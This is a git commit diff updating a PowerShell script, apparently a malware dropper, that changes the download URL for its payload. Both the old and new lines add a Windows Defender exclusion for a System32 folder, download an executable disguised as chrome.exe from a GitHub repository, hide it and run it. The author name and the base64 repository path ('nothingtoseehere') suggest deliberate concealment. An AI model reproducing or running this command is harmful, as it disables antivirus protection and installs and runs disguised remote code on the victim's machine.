8c3fabedfa700138d0967ce4ae26df374f8deaf7
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-06-08 19:20:19 +0300

    Update script12GS-03.ps1

--- script12GS-03.ps1
+++ script12GS-03.ps1
@@ -5,5 +5,5 @@ if (Test-Path -Path $Folder) {
     C:\Windows\System32\Microsoft\chrome.exe
 } else {
     "Path doesn't exist."
-    Add-MpPreference -ExclusionPath "C:\Windows\System32\Microsoft" ; cd C:\Windows\System32\Microsoft ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/chrome.exe" -OutFile chrome.exe ; attrib +h chrome.exe; C:\Windows\System32\Microsoft\chrome.exe
+    Add-MpPreference -ExclusionPath "C:\Windows\System32\Microsoft" ; cd C:\Windows\System32\Microsoft ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/releases/download/untagged-272a9a070e5d3eb21f78/chrome.exe" -OutFile chrome.exe ; attrib +h chrome.exe; C:\Windows\System32\Microsoft\chrome.exe
 }
